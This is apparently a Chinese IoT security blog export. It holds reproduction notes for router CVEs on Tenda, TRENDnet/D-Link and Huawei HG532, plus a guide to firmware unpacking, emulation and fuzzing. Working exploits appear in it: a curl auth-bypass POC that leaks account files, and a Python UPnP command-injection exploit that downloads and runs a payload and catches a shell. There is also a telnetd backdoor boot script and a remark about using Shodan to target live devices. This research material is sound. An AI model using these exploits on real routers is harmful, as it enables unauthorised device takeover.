漏洞利用效果：执行任意系统命令 漏洞披露时间：2023.05.04 漏洞描述： Tenda AC18 v15.03.05.19（6318_）cn 已通过 setUsbUnload 函数中的 deviceName 参数发现包含命令注入漏洞 设备型号：Tenda AC18 v15.03.05.19（6318_）cn 设备架构：arm 复现进度： 静态分析 受影响的漏洞组件 ： 文件名：httpd 定位漏洞组件的方法和工具： SaTC IDA 漏洞分析 # 与CVE-2020–10987相同：\n将deviceName参数借传到了doSystemCmd函数中的，将导致一个任意的命令执行\nTRENDnet # CVE-2018-7034 # 漏洞基本信息 # 漏洞编号：CVE-2018-7034 漏洞类型： 权限绕过漏洞 漏洞利用效果：获取到登录的用户名和密码，成功登录后台 漏洞披露时间：2018.02.14 漏洞描述： 允许通过AUTHORIZED_GROUP=1值绕过身份验证 设备型号：TRENDnet TEW-751DR v1.03B03, TEW-752DRU v1.03B01, TEW733GR v1.03B01，此外D-Link的一些老设备，如DIR645，DIR815等也都受该漏洞影响 设备架构：mips 复现进度： 漏洞复现 受影响的漏洞组件 ： 文件名： 功能： 技术栈：（脚本语言） 定位漏洞组件的方法和工具： 直接审计php代码 IDA 漏洞分析 # 详细分析可以看 ZIKH26师傅的文章，写得非常清楚\n查看htdocs/web/getcfg.php：\nHTTP/1.1 200 OK Content-Type: text/xml \u0026lt;?echo \u0026#34;\u0026lt;?\u0026#34;;?\u0026gt;xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;\u0026lt;?echo \u0026#34;?\u0026gt;\u0026#34;;?\u0026gt; \u0026lt;postxml\u0026gt; \u0026lt;? include \u0026#34;/htdocs/phplib/trace.php\u0026#34;; if ($_POST[\u0026#34;CACHE\u0026#34;] == \u0026#34;true\u0026#34;) { echo dump(1, \u0026#34;/runtime/session/\u0026#34;.$SESSION_UID.\u0026#34;/postxml\u0026#34;); } else { if($AUTHORIZED_GROUP \u0026lt; 0) { /* not a power user, return error message */ echo \u0026#34;\\t\u0026lt;result\u0026gt;FAILED\u0026lt;/result\u0026gt;\\n\u0026#34;; echo \u0026#34;\\t\u0026lt;message\u0026gt;Not authorized\u0026lt;/message\u0026gt;\\n\u0026#34;; } else { /* cut_count() will return 0 when no or only one token. */ $SERVICE_COUNT = cut_count($_POST[\u0026#34;SERVICES\u0026#34;], \u0026#34;,\u0026#34;); TRACE_debug(\u0026#34;GETCFG: got \u0026#34;.$SERVICE_COUNT.\u0026#34; service(s): \u0026#34;.$_POST[\u0026#34;SERVICES\u0026#34;]); $SERVICE_INDEX = 0; while ($SERVICE_INDEX \u0026lt; $SERVICE_COUNT) { $GETCFG_SVC = cut($_POST[\u0026#34;SERVICES\u0026#34;], $SERVICE_INDEX, \u0026#34;,\u0026#34;); TRACE_debug(\u0026#34;GETCFG: serivce[\u0026#34;.$SERVICE_INDEX.\u0026#34;] = \u0026#34;.$GETCFG_SVC); if ($GETCFG_SVC!=\u0026#34;\u0026#34;) { $file = \u0026#34;/htdocs/webinc/getcfg/\u0026#34;.$GETCFG_SVC.\u0026#34;.xml.php\u0026#34;; /* GETCFG_SVC will be passed to the child process. */ if (isfile($file)==\u0026#34;1\u0026#34;) dophp(\u0026#34;load\u0026#34;, $file); } $SERVICE_INDEX++; } } } ?\u0026gt;\u0026lt;/postxml\u0026gt; 该漏洞的利用是通过发送 POST 报文在正常字段 SERVICES=DEVICE.ACCOUNT 后紧跟了一个 AUTHORIZED_GROUP=1 （二者用 %0a 连接），导致 cgibin 文件解析时先识别到了第一个 = ，认为 SERVICES 是键，DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1 是值。随后又对字符串进行解码，%0a 处理为 \\n，此时内存中字符串为 _POST_SERVICES=DEVICE.ACCOUNT\\nAUTHORIZED_GROUP=1 ，后续在 cgibin 中认证失败，在此基础上添加了 AUTHORIZED_GROUP=-1\n之后把整个数据发送给 php 文件进行处理， getcfg.php 文件中if($AUTHORIZED_GROUP \u0026lt; 0) 获取字段值时，首先解析到的是 AUTHORIZED_GROUP=1 从而通过了验证。又因为可以加载 htdocs/webinc/getcfg 目录下的任意文件，最终造成敏感文件的信息泄露\n将POST发送的内容设为SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1即可完成\n漏洞复现 # 这里在我们qemu模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接patch掉，因此，在本地是不好复现的，不过，我们可以打远程。\n使用 shodan（ https://www.shodan.io/search?query=tew-751dr ） 查找到还在用此路由器设备的站点\n可以复现漏洞，但是这样的行为不太好（）\nPOC如下：\ncurl -d \u0026#34;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1\u0026#34; \u0026#34;http://某ip/getcfg.php\u0026#34; HUAWEI # CVE-2017-17215 # 漏洞基本信息 # 漏洞编号：CVE-2017-17215 漏洞类型： 远程命令执行（RCE） 漏洞利用效果：注入任意命令并执行 漏洞披露时间：20171204 漏洞描述： 华为HG532存在远程代码执行漏洞。经身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击。成功利用这个漏洞可以导致远程执行任意代码 设备型号：HG532 设备架构：mips 复现进度： 已成功在本地复现漏洞 已进行静态分析 受影响的漏洞组件 ： 文件名：upnp 定位漏洞组件的方法和工具： 静态分析工具 ida(32位) ghidra 动态分析工具 gdb-multiarch 解包 # ### 安装sasquatch $ sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev $ git clone https://github.com/devttys0/sasquatch.git $ cd sasquatch \u0026amp;\u0026amp; ./build.sh $ binwalk -Me HG532eV100R001C02B015_upgrade_main.bin $ cd _HG532eV100R001C02B015_upgrade_main.bin.extracted/squashfs-root/bin/ $ checksec upnp 漏洞分析 # 搜索NewStatusURL字符串，在0x00407B20的地址上创建函数 然后看sub_407B20的伪代码\n观察到snprintf函数会将我们发送的标签的内容写入字符串，并在之后会用system执行该字符串，这就很明显会存在一个任意命令执行的漏洞，我们可以将;\u0026lt;cmd\u0026gt;;写入标签，由于;可连接两个独立语句并执行，因此，就能执行我们的cmd命令了。\n这里的反编译其实有些问题，应该是：snprintf(v6, 1024, \u0026quot;upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -b\u0026quot;, v4, v5);，这里少了个参数。\n至此，我们发现，可以在NewStatusURL或NewDownloadURL标签中注入任意命令以执行。\n漏洞复现 # $ ./fat.py /path/to/firmware 可以仿真，但是upnp服务不可用，所以无法复现漏洞 后来搜索到了网上复现记录\nIoT-vulhub/HUAWEI/CVE-2017-17215 at master · Vu1nT0tal/IoT-vulhub (github.com)\n按照上面的步骤来复现：\n$ sudo docker build -t firmianay/qemu-system:mips . 其中run.sh的内容为：\n#!/bin/bash # 启动 ssh 服务 /etc/init.d/ssh start # 配置网卡 tunctl -t tap0 ifconfig tap0 192.168.2.1/24 # 启动 http 服务 nohup python3 -m http.server 8000 1\u0026gt;\u0026amp;/dev/null \u0026amp; # 进入 qemu 镜像目录 cd /root/images /usr/bin/expect\u0026lt;\u0026lt;EOF set timeout 10000 spawn qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append \u0026#34;root=/dev/sda1 console=tty0\u0026#34; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic expect \u0026#34;debian-mips login:\u0026#34; send \u0026#34;root\\r\u0026#34; expect \u0026#34;Password:\u0026#34; send \u0026#34;root\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;ifconfig eth0 192.168.2.2/24\\r\u0026#34; #expect \u0026#34;root@debian-mips:~# \u0026#34; #send \u0026#34;echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;scp root@192.168.2.1:/root/squashfs-root.tar.gz /root/squashfs-root.tar.gz\\r\u0026#34; expect { \u0026#34;(yes/no)? \u0026#34; { send \u0026#34;yes\\r\u0026#34;; exp_continue } \u0026#34;password: \u0026#34; { send \u0026#34;root\\r\u0026#34; } } expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;tar xzf squashfs-root.tar.gz \u0026amp;\u0026amp; rm squashfs-root.tar.gz\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;mount -o bind /dev ./squashfs-root/dev \u0026amp;\u0026amp; mount -t proc /proc ./squashfs-root/proc\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;scp -r root@192.168.2.1:/root/tools /root/squashfs-root/tools\\r\u0026#34; expect { \u0026#34;(yes/no)? \u0026#34; { send \u0026#34;yes\\r\u0026#34;; exp_continue } \u0026#34;password: \u0026#34; { send \u0026#34;root\\r\u0026#34; } } expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;echo \u0026#39;sleep 30\u0026#39; \u0026gt; net.sh\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;echo \u0026#39;ifconfig eth0 192.168.2.2/24\u0026#39; \u0026gt;\u0026gt; net.sh\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;echo \u0026#39;ifconfig br0 192.168.2.3/24\u0026#39; \u0026gt;\u0026gt; net.sh\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;chmod +x net.sh \u0026amp;\u0026amp; /bin/sh net.sh \u0026amp;\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;chroot squashfs-root/ sh\\r\u0026#34; expect \u0026#34;# \u0026#34; send \u0026#34;./bin/upnp\\r\u0026#34; expect \u0026#34;# \u0026#34; send \u0026#34;./bin/mic\\r\u0026#34; expect eof EOF 成功仿真！\n最后，我们就可以打exp并成功复现完CVE-2017-17215这个漏洞了！\nexp:\n#!/usr/bin/python3 import requests from requests.auth import HTTPDigestAuth from pwn import * from threading import Thread cmd = \u0026#39;wget -g 192.168.2.1 -P 8000 -r /tools/msf -l /msf\\n\u0026#39; cmd += \u0026#39;chmod 777 /msf\\n\u0026#39; cmd += \u0026#39;/msf\u0026#39; assert(len(cmd) \u0026lt; 255) data = \u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; ?\u0026gt;\\n \u0026lt;s:Envelope xmlns:s=\\\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\\\u0026#34; s:encodingStyle=\\\u0026#34;http://schemas.xmlsoap.org/soap/encoding/\\\u0026#34;\u0026gt;\\n \u0026lt;s:Body\u0026gt;\u0026lt;u:Upgrade xmlns:u=\\\u0026#34;urn:schemas-upnp-org:service:WANPPPConnection:1\\\u0026#34;\u0026gt;\\n \u0026lt;NewStatusURL\u0026gt;$(\u0026#34; + cmd + \u0026#34;)\u0026lt;/NewStatusURL\u0026gt;\\n\u0026lt;NewDownloadURL\u0026gt;$(echo HUAWEIUPNP)\u0026lt;/NewDownloadURL\u0026gt;\\n\u0026lt;/u:Upgrade\u0026gt;\\n \u0026lt;/s:Body\u0026gt;\\n \u0026lt;/s:Envelope\u0026gt;\u0026#34; url = \u0026#34;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1\u0026#34; def attack(): try: requests.post(url, auth=HTTPDigestAuth(\u0026#39;dslf-config\u0026#39;, \u0026#39;admin\u0026#39;), data=data) except Exception as e: print(e) thread = Thread(target=attack) thread.start() io = listen(31337) io.wait_for_connection() log.success(\u0026#34;getshell\u0026#34;) io.interactive() thread.join() 复现成功！\n","date":"February 22, 2024","permalink":"/posts/iot/0x02/","section":"Posts","summary":"如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 漏洞","title":"IoT漏洞复现记录"},{"content":" 如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 固件获取 # 固件厂商官网 # 一些国内路由器厂商的固件下载链接：\ntotolink 极路由/hiwifi D-LINK FAST TP-LINK MERCURY Tenda 磊科 维盟 艾泰 锐捷 飞鱼星 newifi b-link 华硕 腾达 拓实 netis 华硕 抓取更新包 # wireshark配合热点抓设备升级的包\n工具：wireshark、ettercap 流程：中间人-\u0026gt;开始抓包-\u0026gt;在线升级-\u0026gt;分析固件地址-\u0026gt;下载 案例： 华为路由WS5200 四核版这款路由器在网上找不到现有固件，我们尝试一下是否可以通过抓包在线升级过程获取固件。首先关闭防火墙，否则无法访问路由器的服务，无法做中间人攻击。使用ettercap进行arp欺骗，sudo ettercap -Tq -i ens33 -M arp:remote /192.168.31.1// /192.168.31.134//打开wireshark进行抓包。理论上说，点击升级固件之后，wireshark就能够记录升级固件的整个过程(HTTP),但是结果却并不理想。\n还好华为路由器自带了抓包的功能（方便后期的调试和维护），所以直接使用这个功能抓取报文，比做中间人要直接了当得多。\n在点击升级固件之后，我们可以看到大量发往58.49.156.104这个地址的报文，猜测极有可能是华为的服务器，过滤一下会看得更清楚可以看到在通过三次TCP握手之后，华为路由器向服务器发送了get请求，uri就是获取固件的地址： http://update.hicloud.com/TDS/data/files/p14/s145/G4404/g1810/v272964/f1/WS5200_10.0.2.7_main.bin\n点击即可拿到最新的固件\n还可以用burpsuite来抓取APP请求设备升级的包\n固件解密 # 参考链接：\n固件解密 - IOT 固件安全 All in One (gitbook.io)\n可以先上网查询有没有相关文章 也可以看一下同一品牌的其他固件是如何解密的 解密固件是分析加密固件所需迈过的第一道坎\n部分固件的解密思路还可以参考以下思路：\n看看是不是仍有少部分固件（或过渡版本的固件）并未加密，当这些固件升级的过程中大概也会使用到解密的程序，因此可以通过解开这些未加密固件，找到解密程序，并逆向分析出相关算法，这也是固件解密常用的一种手段。并且，一般一个厂商的固件加密算法都是相同的，这样所有的固件我们都能够解开了\n解密完固件为后续的静态分析做准备\n固件解包 # 初入IOT安全研究时，对于大部分固件直接binwalk -Me就可以了\nbinwalk -Me *.bin 对文件夹重新打包成zip，从linux下转到windows下源码审计\nzip -r -q -o pack.zip test/ cp ./pack.zip /mnt/hgfs/share 以下介绍几种需要绕点弯的情况\nUBI # (Unsorted Block Image)\nUBI格式的固件算比较常见的，binwalk并不能直接解包，但是github上有现成的工具 ubi_reader\nUBI_reader解包，UBI文件必须是1024bytes的整数倍，需要增删内容对齐，比如通过分析某路由器，发现其rootfs是UBI格式：\n# binwalk ROM/wifi_firmware_c91ea_1.0.50.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 684 0x2AC UBI erase count header, version: 1, EC: 0x0, VID header offset: 0x800, data offset: 0x1000 首先安装ubi_reader：\n$ sudo apt-get install liblzo2-dev $ sudo pip install python-lzo $ git clone \u0026lt;https://github.com/jrspruitt/ubi_reader\u0026gt; $ cd ubi_reader $ sudo python setup.py install 或者直接$ sudo pip install ubi_reader 然后将根据地址将UBI结构提取出来，利用ubireader_extract_files [options] path/to/file 即可解包\nPFS # 运行binwalk后查看结果，发现没有发现任何可识别的东西，此时可以手动分析或者去搜索一些相关工具。 这里在github上找到 相关工具，直接根据提示使用命令就可解开固件\n简单看一下固件解包关键代码，关键在于找到类似\u0026rsquo;\\xA5\\xA5\\xA5\\x5A\\xA5\\x5A\u0026rsquo;的header，之后根据具体格式解包解压即可，所以固件解包说到底还是数据格式分析\ndef decompress_firmware(data): flen = len(data) sigstart = data.find(\u0026#39;\\\\xA5\\\\xA5\\\\xA5\\\\x5A\\\\xA5\\\\x5A\u0026#39;) if sigstart \u0026lt;= 0: sigstart = data.find(\u0026#39;\\\\x5A\\\\x5A\\\\xA5\\\\x5A\\\\xA5\\\\x5A\u0026#39;) if sigstart \u0026gt; 0: if draytools.verbose: print \u0026#39;Signature found at [0x%08X]\u0026#39; % sigstart lzosizestart = sigstart + 6 lzostart = lzosizestart + 4 lzosize = unpack(\u0026#39;\u0026gt;L\u0026#39;, data[lzosizestart:lzostart])[0] return data[0x100:sigstart+2] \\\\ + pydelzo.decompress(\u0026#39;\\\\xF0\u0026#39; + pack(\u0026#34;\u0026gt;L\u0026#34;,0x1000000) \\\\ + data[lzostart:lzostart+lzosize]) 之后可参考：\nhttps://wokough.gitbook.io/iot-firmware-aio/wiki/gu-jian-jie-pou#:~:text=%E5%8D%B3%E5%8F%AF%E8%A7%A3%E5%8C%85%E3%80%82-,PFS,-%E6%9C%89%E4%BA%9B%E5%9B%BA%E4%BB%B6\nOpenwrt Lua # 可参考：\nhttps://wokough.gitbook.io/iot-firmware-aio/wiki/gu-jian-jie-pou#:~:text=...-,Openwrt%20Lua,-lua%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90\nU-boot # RTOS（实时操作系统）\nboot类的固件也是我们常会遇见的一类无文件系统固件，比如很多IOT设备会采用 U-boot作引导，因为U-boot开源，我们可以参照源代码分析，对于有些架构的U-boot也可以采用固定套路，比如mips可以根据$gp寄存器等\n固件打包 # 替换启动脚本 # 一般将交叉编译好的telnetd，dropbear(sshd)，gdb放入固件文件，再替换启动脚本打包。 linux的启动脚本套路众多，尤其在IOT设备中，所以可以采用比较巧妙的方法，比如确定/sbin/xxxd服务会开机运行，可以将其替换\n# mv rootfs/sbin/xxxd sbin/xxxdd # touch rootfs/sbin/xxxd # chmod +x rootfs/sbin/xxxd 之后在sbin/xxxd添加\n#!/bin/sh /usr/sbin/telnetd -F -l /bin/sh -p 1234 \u0026amp; /sbin/xxxdd \u0026amp; 交叉编译 # 如果能从正向开发角度来打包当然最方便，也就是交叉编译的事。笔者研究过的一些设备中，主要是路由器固件会部分遵循 GPL，就是开源一部分代码软件(一般本来就是基于开源工具)，并提供剩下软件的二进制文件和整个固件的打包工具(方法)\n下载该zip包，根据自己的需求编译rootfs，最后利用zip包中自带的工具打包\nfirmware-mod-kit # firmware-mod-kit( fmk)可能是最常用的基于binwalk的解打包工具，但是由于很久没用更新，使用场景有限。\nfmk的安装使用如下所示：\n# For ubuntu $ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic bsdmainutils autoconf # For redhat/centos $ yum groupinstall \u0026#34;Development Tools\u0026#34; $ yum install git zlib1g-dev xz-devel python-magic zlib-devel util-linux # 使用 $ ./extract-firmware.sh firmware.bin //解包 $ cp new-telnetd fmk/rootfs/usr/sbin/telnetd //按需修改 $ ./build-firmware.sh //打包 手动分析 # 打包的难度在于固件要与原固件一致，并通过各种校验，否则轻则刷机失败，重则设备变砖。\n有一篇关于netgear upnp漏洞的文章，可以看一下netgear固件打包过程 Netgear R6400 upnp栈溢出漏洞分析 - FreeBuf网络安全行业门户 固件一般会分成许多section，为了方便解析，每个section会有指示头，头中可能会存放标志、大小和crc校验等信息，这些信息都为解打包提供依据。\n比如可以先获取固件大小(十六进制)，根据固件大小端拆分字节，一般是4字节，然后在固件头上寻找类似字节(固件头上的指示长度会减去头长度)，接着从指示大小的字节往后分析就可以澄清格式，和分析网络协议的过程很像。\n固件仿真与FUZZ # 参考链接：\n路由器固件模拟环境搭建（超详细） - 知乎 (zhihu.com)\n揭秘家用路由器0day漏洞挖掘技术——读书笔记 | Ainnia Blog\n仿真分析 - IOT 固件安全 All in One (gitbook.io)\nQEMU # https://wokough.gitbook.io/iot-firmware-aio/wiki/fang-zhen-fen-xi#id-1.1-qemu\n具体问题具体分析\n具体固件使用对应的命令进行仿真\n先上网搜索相关信息，看看有没有文章已经仿真过了 参考之前仿真设备的案例来试着仿真 如果都没有就需要我们参考着官方文档以及对固件的静态分析来自己调整命令 如果遇到一些参数实在没有办法满足时可以先跑起来 在动态调试的过程看是哪个汇编执行报错 再在IDA中进行合适的patch来使得固件可以成功仿真 例如当我们需要向main函数传递参数argv和设置环境变量时，可以先看看官方usage：\n发现我们可以用-0选项传递第一个参数，用-E选项设置环境变量，用-L选项做到类似于更改根目录的效果，用-strace选项追踪程序执行时进程系统调用和所接收的信号，方便调试\nUnicorn # QEMU 提供了一个完整的仿真环境，既可以模拟硬件外设、整个系统，也可以模拟单个二进制程序。而 Unicorn 专注于 CPU 指令的仿真\nUnicorn – The Ultimate CPU emulator (unicorn-engine.org)\n暂时未使用（咕） Qiling # 基于Unicorn的模拟器，可以作为IDA pro插件，也可以利用Qiling Unicornalf进行fuzz，还可以模拟IOT设备固件\n可以直接用pip3 install qiling安装\n以下是模拟ARMj架构路由器固件的部分代码：\nimport os, socket, sys, threading sys.path.append(\u0026#34;..\u0026#34;) from qiling import * def patcher(ql): ... def nvram_listener(): ... def my_sandbox(path, rootfs): ql = Qiling(path, rootfs, output = \u0026#34;debug\u0026#34;) ql.add_fs_mapper(\u0026#34;/dev/urandom\u0026#34;,\u0026#34;/dev/urandom\u0026#34;) ql.hook_address(patcher ,ql.loader.elf_entry) ql.run() if __name__ == \u0026#34;__main__\u0026#34;: nvram_listener_therad = threading.Thread(target=nvram_listener, daemon=True) nvram_listener_therad.start() my_sandbox([\u0026#34;rootfs/bin/httpd\u0026#34;], \u0026#34;rootfs\u0026#34;) 暂时未使用（咕） Firmadyne # 基于Linux的固件的仿真 firmadyne/firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware (github.com)\n成功概率较低，不常用 FirmAE # 成功概率较高（优于Firmadyne） FirmAE significantly increases the emulation success rate (From Firmadyne\u0026rsquo;s 16.28% to 79.36%) FirmAE及DlinkDIR320、600、645漏洞复现 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn pr0v3rbs/FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis (github.com) Index of /pub/Router/DIR-645/Firmware (dlink.ru) 安装：\ngit clone --recursive https://github.com/pr0v3rbs/FirmAE ./download.sh ./install.sh 使用：\n执行脚本\n./init.sh 准备固件\n# 举例： wget https://github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip 检查仿真\nsudo ./run.sh -c \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt; 分析目标固件\n分析模式使用 FirmAE 分析器 sudo ./run.sh -a \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt; 运行模式有助于测试 Web 服务或执行自定义分析器 sudo ./run.sh -r \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt; Firmware Analysis Toolkit # attify/firmware-analysis-toolkit: Toolkit to emulate firmware and analyse it for security vulnerabilities (github.com)\n安装：\ngit clone https://github.com/attify/firmware-analysis-toolkit cd firmware-analysis-toolkit ./setup.sh # fat.config [DEFAULT] sudo_password=attify123 firmadyne_path=/home/attify/firmadyne 使用：\n./fat.py \u0026lt;firmware file\u0026gt; $ ./fat.py DIR-601_REVB_FIRMWARE_2.01.BIN __ _ / _| | | | |_ __ _ | |_ | _| / _` | | __| | | | (_| | | |_ |_| \\__,_| \\__| Welcome to the Firmware Analysis Toolkit - v0.3 Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation By Attify - https://attify.com | @attifyme [+] Firmware: DIR-601_REVB_FIRMWARE_2.01.BIN [+] Extracting the firmware... [+] Image ID: 1 [+] Identifying architecture... [+] Architecture: mipseb [+] Building QEMU disk image... [+] Setting up the network connection, please standby... [+] Network interfaces: [(\u0026#39;br0\u0026#39;, \u0026#39;192.168.0.1\u0026#39;)] [+] All set! Press ENTER to run the firmware... [+] When running, press Ctrl + A X to terminate qemu FirmAFL # zyw-200/FirmAFL: FIRM-AFL is the first high-throughput greybox fuzzer for IoT firmware. (github.com)\n论文FirmAFL固件模糊测试工具——复现之路-CSDN博客\n使用并改进了Firmdyne模拟方式，并利用AFL对IoT固件实施高通量灰盒Fuzzing\n# 编译用户模式 cd ./FirmAFL/user_mode/ sed -i \u0026#39;40s/static //\u0026#39; util/memfd.c ./configure --target-list=mipsel-linux-user,mips-linux-user,arm-linux-user --static --disable-werror make # 编译系统模式 cd ../qemu_mode/DECAF_qemu_2.10/ sed -i \u0026#39;40s/static //\u0026#39; util/memfd.c ./configure --target-list=mipsel-softmmu,mips-softmmu,arm-softmmu --disable-werror make # 安装Firmadyne并设置数据库 cd ../../ sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan git clone --recursive \u0026lt;https://github.com/firmadyne/firmadyne.git\u0026gt; cd ../FirmAFL/firmadyne sudo apt-get install postgresql sudo apt-get install libpq-dev dropdb -U firmadyne -h 127.0.0.1 firmware sudo -u postgres createuser -P firmadyne sudo -u postgres createdb -O firmadyne firmware cd database cp /home/churchkm/Downloads/data.xz ./ xz -d data.xz mv data schema chmod +x schema sudo -u postgres psql -d firmware \u0026lt; ./schema # 使用Firmadyne仿真固件 cd ../ sudo ./download.sh sed -i \u0026#39;4s/#//\u0026#39; firmadyne.config cp ../firmadyne_modify/makeImage.sh ./scripts/ sudo ./sources/extractor/extractor.py -b dlink -sql 127.0.0.1 -np -nk \u0026#34;../firmware/DIR-815_FIRMWARE_1.01.ZIP\u0026#34; images sudo ./scripts/getArch.sh ./images/9050.tar.gz sudo ./scripts/makeImage.sh 9050 sudo ./scripts/inferNetwork.sh 9050 # 使用FirmAFL进行Fuzzing cd ../ python3 FirmAFL_setup.py 9050 mipsel cp ./FirmAFL_config/9050/run.sh ./image_9050/ #即用FirmAFL_config中的run.sh替换image_9050中的run.sh cd image_9050 sudo ./run.sh # 固件启动后，新终端下执行 python3 test.py sudo user.sh FirmFuzz # FirmFuzz的使用侧重Fuzzing，固件解包可单独使用firmadyne extractor或者binwalk\nhttps://github.com/HexHive/FirmFuzz.git\nFuzzware # fuzzware-fuzzer/fuzzware: Fuzzware\u0026rsquo;s main repository. Start here to install. (github.com)\ngit clone https://github.com/fuzzware-fuzzer/fuzzware.git sudo ./build_docker.sh sudo ./run_docker.sh examples fuzzware pipeline --skip-afl-cpufreq pw-recovery/ARCH_PRO sudo ./run_docker.sh test fuzzware pipeline --skip-afl-cpufreq . 成功将固件跑起来：\n由图可以看到刚开始运行时发现新的MMIO寄存器模型，由于MMIO Access Model中并不存在，因此会将其定义为新的模型，然后继续向下运行\n建模完毕后，开始进行正常的fuzzing阶段：\n每一轮fuzzing结束后，根据反馈调整输入，开始下一阶段fuzzing：\nafl # 安装\nafl安装会报错，可以按照 这篇博客来修改： 不过我们可以安装的afl++ 所以可以直接跳过afl部分 AFL（afl-qemu mode）的安装和使用（一）_afl qemu-CSDN博客 afl安装 Ubuntu 22.04 安装 AFL 及 qemu mode 实践 | 云吱的小站 (haoyep.com) qemu模块的安装及无源码fuzz可以参考这篇文章 alf++ # AFL源码阅读（一）：启程 (ruanx.net)\n安装： # sudo apt-get update sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed \u0026#39;s/.* //\u0026#39;|sed \u0026#39;s/\\..*//\u0026#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed \u0026#39;s/.* //\u0026#39;|sed \u0026#39;s/\\..*//\u0026#39;)-dev cd $HOME git clone https://github.com/AFLplusplus/AFLplusplus \u0026amp;\u0026amp; cd AFLplusplus export LLVM_CONFIG=\u0026#34;llvm-config-11\u0026#34; make distrib sudo make install # export CC=/home/closure/AFLplusplus/afl-clang-fast # export CXX=/home/closure/AFLplusplus/afl-clang-fast++ # export LLVM_CONFIG=\u0026#34;llvm-config-11\u0026#34; 使用： # 使用 afl-gcc 进行插桩编译：\nafl-gcc test.c -o test_file gcc test.c -o test_gcc afl-gcc 插桩编译后，fuzz 的速度会快一些 接下来就可以进行 fuzz 了：\nafl-fuzz -i ./fuzz_in -o ./fuzz_out ./test_file -f fuzz_in 为语料库，可以直接使用 AFL 自带的 testcases fuzz_out 就是输出的内容 现在我们开始 fuzz。首先利用 afl-clang-lto 编译一个有漏洞的代码hello.c。AFL++ 文档中有“如何选择编译器”的 指引。我们手上的 llvm 版本大于 11，所以选择 LTO mode。\nafl-gcc ./hello.c -o hello /home/iot/test/tools/AFLplusplus/afl-gcc ./hello.c -o hello 构造一些初始输入，放进 inputs 文件夹里面。笔者使用了两条初始输入： helloworld 以及 anna 。它们自身不会让程序崩溃，我们希望 AFL++ 寻找到能让程序崩溃的输入。\n运行 AFL++：\nafl-fuzz -i inputs/ -o out/ -- ./hello /home/iot/test/tools/AFLplusplus/afl-fuzz -i ./fuzz_in -o ./fuzz_out -- ./hello @@ 无源码fuzz： # 配置：\nsudo apt-get install libtool-bin libgtk2.0-dev -y cd /home/iot/test/tools/AFLplusplus/qemu_mode ./build_qemu_support.sh cd .. sudo make install afl-fuzz -Q -m none -i in -o out ./pwn_file @@ /home/iot/test/tools/AFLplusplus/afl-fuzz -i fuzz_in -o ./fuzz_out -Q ./pwn SaTC # NSSL-SJTU/SaTC: A prototype of Shared-keywords aware Taint Checking, a novel static analysis approach that tracks the data flow of the user input between front-end and back-end to precisely detect security vulnerabilities. (github.com)\n安装\n建议通过使用Dockerfile来构建系统环境:\n# 进入SaTC代码目录 cd SaTC # 构建Docker镜像 docker build . -t satc # 进入Dokcer环境, 自行添加目录映射 docker run -it satc 如果因为网络等原因无法构建，可使用我们提供等docker image\n# 从docker hun拉去image docker pull smile0304/satc:V1.0 # 进入Dokcer环境, 自行添加目录映射 docker run -it smile0304/satc:V1.0 使用方法\nusage: satc.py [-h] -d /root/path/_ac18.extracted -o /root/output [--ghidra_script {ref2sink_cmdi,ref2sink_bof,share2sink,ref2share,all}] [--save_ghidra_project] --taint_check [-b /var/ac18/bin/httpd | -l 3] SATC tool optional arguments: -h, --help 查看帮助 -d /root/path/_ac18.extracted, --directory /root/path/_ac18.extracted 指定从固件中提取出的文件系统 -o /root/output, --output /root/output 指定结果输出位置 --ghidra_script {ref2sink_cmdi,ref2sink_bof,share2sink,ref2share,all} (可选) 指定要使用的 Ghidra 